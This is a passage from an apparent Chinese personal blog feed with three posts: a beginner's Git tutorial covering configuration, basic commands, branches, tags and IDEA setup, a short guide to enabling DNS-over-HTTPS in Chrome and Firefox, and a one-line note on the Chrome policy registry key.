        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="git-能做什么"><a class="markdownIt-Anchor" href="#git-能做什么"></a> Git 能做什么？</h2><p>Git 是一个分布式版本控制工具，主要用于管理文件。学习 Git 之后可以实现：</p><ul><li>代码回溯</li><li>版本切换</li><li>多人协作</li><li>远程备份</li></ul><h2 id="什么是本地仓库远程仓库"><a class="markdownIt-Anchor" href="#什么是本地仓库远程仓库"></a> 什么是本地仓库？远程仓库？</h2><p>本地仓库和远程仓库都可以顾名思义。当在本地创建了一个本地仓库之后，可以选择不推送到远程，这样也能实现本地文件的版本控制，当推送到远程仓库之后就可以免除换电脑的烦恼，且多人协作也可以流畅进行。</p><h2 id="git-全局配置"><a class="markdownIt-Anchor" href="#git-全局配置"></a> Git 全局配置</h2><p>安装 Git 只需找到官网然后一路下一步即可。</p><p>在安装之后可以将 git 加入环境变量方便使用，然后我们进行全局配置：配置用户名和 email 地址。之后的每次 Git 提交都会使用此配置信息。</p><p>在 Git 命令行中执行以下命令</p><ul><li>设置用户信息 </li></ul><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">git</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">config</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">--global</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">user.name</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"Your Name"</span></span><span class="line"><span style="color: #DCDCAA">git</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">config</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">--global</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">user.email</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"Your Email Address"</span></span></code></pre></div></div></figure><ul><li>查看配置信息</li></ul><p>配置好上面的信息后执行下面的命令进行检查</p><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">git</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">config</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">--list</span></span></code></pre></div></div></figure><blockquote><p>注：上面设置的用户信息的 <a href="http://user.name">user.name</a> 和 user.email 并不一定要注册仓库的账号名和邮箱地址</p></blockquote><h2 id="git-命令"><a class="markdownIt-Anchor" href="#git-命令"></a> Git 命令</h2><h3 id="本地仓库"><a class="markdownIt-Anchor" href="#本地仓库"></a> 本地仓库</h3><ol><li>在任意目录下创建一个空目录（如 repo1）作为本地 Git 仓库</li><li>进入这个目录中，Git bash here</li><li> 执行命令 <code>git init</code></li></ol><p>如果在当前目录中可找到<code>.git</code> 文件夹（此文件夹为隐藏文件夹）则说明 Git 仓库创建成功</p><p>除了上述方法生成本地仓库，还可以克隆 <code>git clone repoAddress</code> 远程仓库到本地，这样也能拥有一个本地仓库，注意一个目录下只能存在一个仓库，且不用再准备一个空的目录，因为克隆下来的仓库会将仓库封装到以仓库名为名字的文件夹下</p><h4 id="常用命令"><a class="markdownIt-Anchor" href="#常用命令"></a> 常用命令</h4><table><thead><tr><th style="text-align:left">git status</th><th style="text-align:left"> 查看文件状态</th></tr></thead><tbody><tr><td style="text-align:left"> git add</td><td style="text-align:left"> 将文件的修改加入暂存区</td></tr><tr><td style="text-align:left"> git reset</td><td style="text-align:left"> 将暂存区的文件取消暂存或者是切换到指定的版本 git reset --hard version</td></tr><tr><td style="text-align:left">git commit</td><td style="text-align:left"> 将暂存区的文件修改提交到版本库</td></tr><tr><td style="text-align:left"> git log</td><td style="text-align:left"> 查看日志</td></tr></tbody></table><h4 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h4><blockquote><p>看到克隆或创建的仓库的<code>.git</code> 文件夹你可能会好奇这到底是什么？</p></blockquote><ul><li>版本库：其实该<code>.git</code> 文件夹就是版本库，版本库汇总存储了很多配置信息、日志信息、文件版本信息等</li><li>工作区：包含<code>.git</code> 文件夹的目录就是工作区，也成为工作目录，主要存放开发的代码文件</li><li>暂存区：<code>.git</code> 文件夹文件夹中有很多文件，当你新增一个文件（如 1.txt）与.git 文件夹同级，此时 <code>1.txt</code> 已经在工作区，但他还未被 Git 进行版本管理，Git 进行版本控制的流程为：<mark>工作区 -&gt; 暂存区 -&gt; 版本库</mark>。<br>所以此时要进行 <code>git add fileName1 filename2 ...</code> 操作将其添加到暂存区，此操作将会使得<code>.git</code> 目录下出现一个 <code>index</code> 文件，也可以叫做 stage，也就是暂存区了。<br>然后执行 <code>git commit -m "HintMsg" fileName</code> 即可将其提交到版本库中进行管理</li></ul><blockquote><p>那么工作区那么多文件，我该如何分辨哪些是被版本控制的哪些没有呢？</p></blockquote><p>Git 工作区中的文件存在两种状态：</p><ul><li>untracked 未跟踪（未被纳入版本控制）</li><li>tracked 已跟踪 （已被纳入版本控制）<ul><li>Unmodified 为修改状态</li><li> Modified 已修改状态</li><li> Staged 已暂存状态</li></ul></li></ul><p>可以执行指令 <code>git status</code> 查看当前仓库是否存在可提交的文件，并展示文件状态</p><p>注意：当一个文件已经被 tracked，之后只是进行了修改，是无需重新进行 <code>git add</code> 操作的，可以直接 commit，未被 commit 前它的状态是 Modified 属于 tracked 当中，可使用上述命令查看验证。</p><h3 id="远程仓库"><a class="markdownIt-Anchor" href="#远程仓库"></a> 远程仓库</h3><table><thead><tr><th style="text-align:left">git remote</th><th style="text-align:left"> 查看远程仓库，查看详细信息 git remote -v</th></tr></thead><tbody><tr><td style="text-align:left">git remote add <shortname> <url></url></shortname></td><td style="text-align:left">添加本地仓库关联的远程仓库，shortName 为别名一般为 origin</td></tr><tr><td style="text-align:left">git clone</td><td style="text-align:left"> 从远程仓库克隆</td></tr><tr><td style="text-align:left"> git pull</td><td style="text-align:left"> 从远程仓库拉取</td></tr><tr><td style="text-align:left"> git push <shorname> branchName</shorname></td><td style="text-align:left"> 推送到远程仓库</td></tr></tbody></table><h2 id="git-分支"><a class="markdownIt-Anchor" href="#git-分支"></a> Git 分支</h2><p>分支是 Git 使用过程中非常重要的概念。使用分支意味着你可以把你的工作从开发主线上分离开来，以免影响开发主线。<br>同一个仓库可以有多个分支，各个分支相互独立，互不干扰。<br>通过 <code>git init </code>命令创建本地仓库时默认会创建一个 master 分支。</p><table><thead><tr><th style="text-align:left">git branch</th><th style="text-align:left"> 查看分支，-r 列出所有远程分支，-a 列出所有本地分支和远程分支</th></tr></thead><tbody><tr><td style="text-align:left"> git branch [name]</td><td style="text-align:left"> 创建分支</td></tr><tr><td style="text-align:left"> git checkout [name]</td><td style="text-align:left"> 切换分支</td></tr><tr><td style="text-align:left"> git push [shortName] [name]</td><td style="text-align:left"> 推送至远程仓库分支</td></tr><tr><td style="text-align:left"> git merge [name]</td><td style="text-align:left"> 合并分支，将指定分支合并至当前分支</td></tr><tr><td style="text-align:left"> git branch -d [name]</td><td style="text-align:left"> 删除分支</td></tr></tbody></table><h2 id="git-标签"><a class="markdownIt-Anchor" href="#git-标签"></a> Git 标签</h2><p>GIt 标签类似快照，存储着某一时刻的代码内容、状态等。可类比为版本号 v1.0、v2.0 等</p><table><thead><tr><th style="text-align:left">git tag</th><th style="text-align:left"> 列出已有的标签</th></tr></thead><tbody><tr><td style="text-align:left"> git tag [name]</td><td style="text-align:left"> 创建标签</td></tr><tr><td style="text-align:left"> git push [shortName] [name]</td><td style="text-align:left"> 将标签推送到远程仓库</td></tr><tr><td style="text-align:left"> git checkout -b [branch] [name]</td><td style="text-align:left"> 检出标签</td></tr></tbody></table><blockquote><p>注意：检出标签必须使用 - b 指定检出的分支名，由于标签不是分支，所以切换到某个标签只能将其检出为一个分支，如：<code>git checkout -b bv1 v1.0</code></p></blockquote><h2 id="git-idea-配置"><a class="markdownIt-Anchor" href="#git-idea-配置"></a> Git &amp; IDEA 配置</h2><p>打开 IDEA 的设置，找到版本控制（Version Control）-&gt;Git，将 Git 的本地可执行文件路径（Path to Git executable）补充正确，如果自动检测可用也是可以的，点击右边的测试（Test）如果出现 Git 的版本号就可以，别忘了点击应用</p><p>之后只需要在一个打开的项目中，点击 IDEA 上方导航栏的 VCS-&gt; 创建 Git 仓库（Create Git Repository），选择你要进行管理的项目父文件夹，如：demo-project 下有 src、pom.xml 等文件，就可以选择 demo-project 作为仓库文件夹，<code>.git</code> 版本库会出现在和 src 同级的目录中。此后 VCS 就会变成 Git 了。</p><p>注：IDEA 已帮你省略 add 到暂存区的操作，可以直接选择要提交的文件进行 commit 即可</p><p>当你进行 commit 操作时可能会出现显示可提交的文件的视图而不是我们常看到的目录 - 文件等结构，这时你可以点击上方的小按钮进行选择，选择目录即可</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20240626203148193.png" alt="image-20240626203148193"></p><p>在提交时，提交源码和必要的配置文件即可，无需提交字节码、target 文件夹等</p><p>那么文件那么多，我怎么选择性的提交呢？</p><p>这就是<code>.gitignore</code> 文件的作用之处了，这个文件可配置哪些文件是我们不需要进行提交的，例如：</p><figure class="shiki text"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"># Maven #</span></span><span class="line"><span style="color: #D4D4D4">target/</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4"># IDEA #</span></span><span class="line"><span style="color: #D4D4D4">.idea/</span></span><span class="line"><span style="color: #D4D4D4">*.iml</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4"># Eclipse #</span></span><span class="line"><span style="color: #D4D4D4">.settings/</span></span><span class="line"><span style="color: #D4D4D4">.classpath</span></span><span class="line"><span style="color: #D4D4D4">.project</span></span></code></pre></div></div></figure><p>带 <code>/</code> 的名字表示是一个文件夹而非文件</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在 Windows 中启用 DOH 功能</title>
      <link href="/posts/46175.html"/>
      <url>/posts/46175.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><blockquote><p>适用环境：Windows11（Win10 可以开启浏览器的 DOH）<br>DNS 检测工具：<a href="https://www.nstool.netease.com/">网易 DNS 在线检测</a><br>参考文章：</p><ul><li>网络设置 DOH：<a href="https://zhuanlan.zhihu.com/p/590105276">Windows 11 22H2 开启 DoH（DNS over HTTPS）</a></li><li>检测：<a href="https://wkings.blog/archives/1253">DNS、DoT、DoH 协议测试方法</a></li></ul></blockquote><h2 id="google-浏览器和-firefox-浏览器启用-doh"><a class="markdownIt-Anchor" href="#google-浏览器和-firefox-浏览器启用-doh"></a> Google 浏览器和 Firefox 浏览器启用 DOH</h2><blockquote><p>Google 浏览器版本：123.0.6312.86（正式版本） （64 位）<br>Firefox 浏览器版本：123.0.1 (64 位)</p></blockquote><h2 id="google-浏览器"><a class="markdownIt-Anchor" href="#google-浏览器"></a> Google 浏览器</h2><p>找到<code>设置-&gt;隐私和安全-&gt;安全-&gt;高级</code>在高级区启用使用安全 DNS，并填写 DNS 提供商即可。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32753108/1711905304052-6ab911ae-a57d-433f-9295-726ca12cf59d.png#averageHue=%2325272b&amp;clientId=u46ce7476-c18b-4&amp;from=paste&amp;height=542&amp;id=u7e72b470&amp;originHeight=723&amp;originWidth=1437&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=76344&amp;status=done&amp;style=none&amp;taskId=u66ac412b-9daf-4157-97cb-359a6bb90d3&amp;title=&amp;width=1078" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/32753108/1711905398251-83fc3bce-72de-4982-b6fc-00fda7a52c36.png#averageHue=%232d2e31&amp;clientId=u46ce7476-c18b-4&amp;from=paste&amp;height=425&amp;id=u8e9fd09e&amp;originHeight=566&amp;originWidth=689&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=37874&amp;status=done&amp;style=none&amp;taskId=ud8be3634-e5fe-48df-9622-8b69db22293&amp;title=&amp;width=517" alt="image.png"><br>DNS 提供商填写<a href="https://zhuanlan.zhihu.com/p/590105276">网络设置 DOH</a> 这篇参考文章中的就好。<br>所有设置妥当之后请调用 cmd 输入 <code>ipconfig /flushdns</code> 该命令使得设置生效。</p><h2 id="firefox-浏览器"><a class="markdownIt-Anchor" href="#firefox-浏览器"></a> Firefox 浏览器</h2><p>在设置页面直接搜索 <code>dns</code> 即可。设置如图：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32753108/1711905924937-6e642b87-9294-4a5b-bcf4-567904db0425.png#averageHue=%23293741&amp;clientId=u46ce7476-c18b-4&amp;from=paste&amp;height=716&amp;id=ubbcb1742&amp;originHeight=955&amp;originWidth=683&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=64012&amp;status=done&amp;style=none&amp;taskId=ue1c01ceb-bcd1-4f4e-92bd-ca3db108d44&amp;title=&amp;width=512" alt="image.png"><br>DNS 提供商填写<a href="https://zhuanlan.zhihu.com/p/590105276">网络设置 DOH</a> 这篇参考文章中的就好。<br>所有设置妥当之后请调用 cmd 输入 <code>ipconfig /flushdns</code> 该命令使得设置生效。</p><h2 id="检测是否成功开启-doh"><a class="markdownIt-Anchor" href="#检测是否成功开启-doh"></a> 检测是否成功开启 DOH</h2><blockquote><p>涉及工具：<a href="https://dns.lookup.dog/#installation">dog 工具</a><br>协议：<br>-U, --udp Use the DNS protocol over UDP<br>-T, --tcp Use the DNS protocol over TCP<br>-S, --tls Use the DNS-over-TLS protocol<br>-H, --https Use the DNS-over-HTTPS protocol</p></blockquote><p>命令示例：<code>dog.exe -H @[https://dns.alidns.com/dns-query](https://dns.alidns.com/dns-query) bilibili.com</code></p><p>先写到这，想起什么了再补充。2024.4.1</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DOH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决谷歌浏览器问题：您的浏览器由贵组织托管解决</title>
      <link href="/posts/27484.html"/>
      <url>/posts/27484.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><meta name="description" content="解决Google浏览器：您的浏览器由贵组织托管">参考：https://blog.csdn.net/w528_net/article/details/119839068<p>注册表地址：<code>计算机\HKEY_CURRENT_USER\SOFTWARE\Policies\Google\Chrome</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google浏览器 </tag>
            
            <tag> 谷歌浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
